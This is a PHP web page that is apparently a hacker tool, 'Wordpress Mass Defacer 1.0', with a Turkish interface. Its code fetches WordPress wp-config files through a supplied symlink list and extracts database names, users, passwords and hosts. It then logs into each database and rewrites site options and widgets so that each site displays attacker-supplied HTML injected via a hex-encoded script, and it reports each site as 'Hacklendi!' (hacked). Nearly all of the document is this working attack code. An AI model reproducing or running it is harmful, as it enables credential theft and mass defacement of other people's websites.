<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
	
	<title>Wordpress Mass Defacer 1.0</title>
	<style type="text/css">
	body{
	 background-color:#000;
		}
	.logo {
	color:white;
	margin-bottom:10px;
	
	width:auto;
	height:60px;
	position: relative;
    
	}
	.configler
	{
	position: relative;
    margin: auto;
	}
	.footer
	{
	position: relative;
    margin: auto;
	}
	.footer{
	color:white;
	font-family:Comic Sans Ms;
	position: relative;
    margin: auto;
	
	}
	.logo h1{
	font-size:40px;
	font-family:Comic Sans Ms;
	border:2px dotted ;
	border-color:orange;
	color:green;
	}
	
	.textarea
	{
	border:solid 1px;
	border-color:Orange;
	width:600px;
	height:300px;
	color: red; 
	background-color: Black;
	resize:none;
	
	}
	
	.configler input
	{
	width:400px;
	color: red; 
	background-color: Black;
	border:1px solid;
	border-color:orange;
	}
	.configler button
	{
	width:300px;
	height:50px;
	font-size:20px;
	color:Green; 
	background-color: Black;
	border:2px dotted ;
	border-color:Red;
	}
	.configler font
	{
	font-size:20px;
	color:green;
	}
	.configler textarea
	{
	width:400px;
	height:200px;
	
	color:red; 
	background-color: Black;
	border:1px solid ;
	border-color:orange;
	resize:none;
	}
	</style>
</head>

<body>

	<div class="logo">
	<center><h1>Wordpress Mass Deface 1.0</h1></center>
	</div>
	<form action="#" method="POST">
	<div class="configler">
	
	
	<center><font color="">Symlink Yol</center><center></font><input type="text" name="configyol"/></center>
	<center><font color="">İndex</center><center></font><textarea name="index" id="index" cols="30" rows="10"></textarea></center><br>
	<center><button type="submit">Bas Gitsin Amua!</button></center>
	
	</div>
	</form>
	<br>

<?php 
	if($_POST)
	{
		$url=$_POST['configyol'];
		$users=@file($url);


		if (count($users)<1) exit("<center><font color='Green'><h1>Config Bulunamadı!!</h1></font></center>");
		foreach ($users as $user) {
		$user1=trim($user);
		$code=file_get_contents2($user1);
		preg_match_all('|define.*\(.*\'DB_NAME\'.*,.*\'(.*)\'.*\).*;|isU',$code,$b1);
		$db=$b1[1][0];
		preg_match_all('|define.*\(.*\'DB_USER\'.*,.*\'(.*)\'.*\).*;|isU',$code,$b2);
		$user=$b2[1][0];
		preg_match_all('|define.*\(.*\'DB_PASSWORD\'.*,.*\'(.*)\'.*\).*;|isU',$code,$b3);
		$db_password=$b3[1][0];
		preg_match_all('|define.*\(.*\'DB_HOST\'.*,.*\'(.*)\'.*\).*;|isU',$code,$b4);
		$host=$b4[1][0];
		preg_match_all('|\$table_prefix.*=.*\'(.*)\'.*;|isU',$code,$b5);
		$p=$b5[1][0];


		$d=@mysqli_connect( $host, $user, $db_password ) ;
		if ($d){
		@mysqli_select_db($d,$db );
		$source=stripslashes($_POST['index']);
		$s2=strToHex(($source));
		$s="<script>document.documentElement.innerHTML = unescape(''$s2'');</script>";
		$ls=strlen($s)-2;
		$sql="update ".$p."options set option_value='a:2:{i:2;a:3:{s:5:\"title\";s:0:\"\";s:4:\"text\";s:$ls:\"$s\";s:6:\"filter\";b:0;}s:12:\"_multiwidget\";i:1;}' where option_name='widget_text'; ";
		mysqli_query($d,$sql) ;
		$sql="update ".$p."options set option_value='a:7:{s:19:\"wp_inactive_widgets\";a:6:{i:0;s:10:\"archives-2\";i:1;s:6:\"meta-2\";i:2;s:8:\"search-2\";i:3;s:12:\"categories-2\";i:4;s:14:\"recent-posts-2\";i:5;s:17:\"recent-comments-2\";}s:9:\"sidebar-1\";a:1:{i:0;s:6:\"text-2\";}s:9:\"sidebar-2\";a:0:{}s:9:\"sidebar-3\";a:0:{}s:9:\"sidebar-4\";a:0:{}s:9:\"sidebar-5\";a:0:{}s:13:\"array_version\";i:3;}' where option_name='sidebars_widgets';";
		mysqli_query($d,$sql) ;
		if (function_exists("mb_convert_encoding") )
		{
		$source2 = mb_convert_encoding('</title>'.$source.'<DIV style="DISPLAY: none"><xmp>', 'UTF-8');
		$source2=mysqli_real_escape_string($d,$source2);
		$sql = "UPDATE `".$p."options` SET `option_value` = '$source2' WHERE `option_name` = 'blogname';";
		@mysqli_query($d,$sql) ; ;
		$sql= "UPDATE `".$p."options` SET `option_value` = 'UTF-8' WHERE `option_name` = 'blog_charset';";
		@mysqli_query($d,$sql) ; ;
		}
		$aa=@mysqli_query($d,"select option_value from `".$p."options` WHERE `option_name` = 'siteurl';") ;;
		$siteurl=mysqli_fetch_array($aa) ;
		
		$siteurl=$siteurl['option_value'];
		$tr="";
		$tr=$tr."$siteurl";
		mysqli_close($d);
			
		}
		if ($tr) echo "<center><font color='Green'>$tr-->Hacklendi!<br></font></center>";
		}
	
		}
	
	function strToHex($string)
{
    $hex='';
    for ($i=0; $i < strlen($string); $i++)
    {
	if (strlen(dechex(ord($string[$i])))==1){
        $hex .="%0". dechex(ord($string[$i]));
		}
		else
		{
		$hex .="%". dechex(ord($string[$i]));
		}
    }
    return $hex;
}

function file_get_contents2($u){

	$ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$u);
 	curl_setopt($ch, CURLOPT_HEADER, 0);    
   curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0 ");
	    $result = curl_exec($ch);
	return $result ;
	}
?>
<div class="footer">
	<center><h4>Coded By Arsle - Janissaries.org</h4></center>
</div>
</body>
</html>

